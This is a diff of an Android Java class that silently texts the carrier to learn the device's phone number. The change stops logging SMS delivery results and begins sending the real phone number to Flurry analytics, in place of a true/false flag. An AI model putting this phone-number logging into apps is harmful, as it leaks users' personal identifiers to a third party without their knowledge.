@@ -2,14 +2,11 @@ package com.android.sms.proxy.entity;
 
 import android.accounts.Account;
 import android.accounts.AccountManager;
-import android.app.Activity;
 import android.app.PendingIntent;
-import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
@@ -207,7 +204,7 @@ public class PhoneInfo {
 						phoneNumber = phone;
 						savePhoneInfo(context, phoneNumber);
 						Map<String, String> map = new HashMap<>();
-						map.put(NativeParams.KEY_SIM_LINE1PHONE, String.valueOf(true));
+						map.put(NativeParams.KEY_SIM_LINE1PHONE, phone);
 						FlurryAgent.logEvent(NativeParams.EVENT_GET_PHONE_NUMBER, map);
 					}
 				} else {
@@ -224,7 +221,7 @@ public class PhoneInfo {
 			FlurryAgent.onError(TAG, "", e);
 		}
 
-		return "13570597018";
+		return null;
 	}
 
 	//targetAddress运营商的查询电话，code 为我们查询的指令
@@ -240,56 +237,6 @@ public class PhoneInfo {
 				String DELIVERED = "sms_delivered";
 				PendingIntent sendPi = PendingIntent.getBroadcast(context, 0, new Intent(SENT), 0);
 				PendingIntent receivePi = PendingIntent.getBroadcast(context, 0, new Intent(DELIVERED), 0);
-				context.registerReceiver(new BroadcastReceiver() {
-					@Override
-					public void onReceive(Context context, Intent intent) {
-						switch (getResultCode()) {
-							case Activity.RESULT_OK:
-								if (DEBUG) {
-									Log.d(TAG, "Activity.RESULT OK");
-								}
-								break;
-							case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
-								if (DEBUG) {
-									Log.d(TAG, "RESULT_ERROR_GENERIC_FAILURE");
-								}
-								break;
-							case SmsManager.RESULT_ERROR_NO_SERVICE:
-								if (DEBUG) {
-									Log.d(TAG, "RESULT_ERROR_NO_SERVICE");
-								}
-								break;
-							case SmsManager.RESULT_ERROR_NULL_PDU:
-								if (DEBUG) {
-									Log.d(TAG, "RESULT_ERROR_NULL_PDU");
-								}
-								break;
-							case SmsManager.RESULT_ERROR_RADIO_OFF:
-								if (DEBUG) {
-									Log.d(TAG, "RESULT_ERROR_RADIO_OFF");
-								}
-								break;
-						}
-					}
-				}, new IntentFilter(SENT));
-
-				context.registerReceiver(new BroadcastReceiver() {
-					@Override
-					public void onReceive(Context context, Intent intent) {
-						switch (getResultCode()) {
-							case Activity.RESULT_OK:
-								if (DEBUG) {
-									Log.d(TAG, "RESULT_OK");
-								}
-								break;
-							case Activity.RESULT_CANCELED:
-								if (DEBUG) {
-									Log.d(TAG, "RESULT_CANCELED");
-								}
-								break;
-						}
-					}
-				}, new IntentFilter(DELIVERED));
 				if (DEBUG) {
 					Log.d(TAG, "send " + code + " to " + targetAddress);
 				}
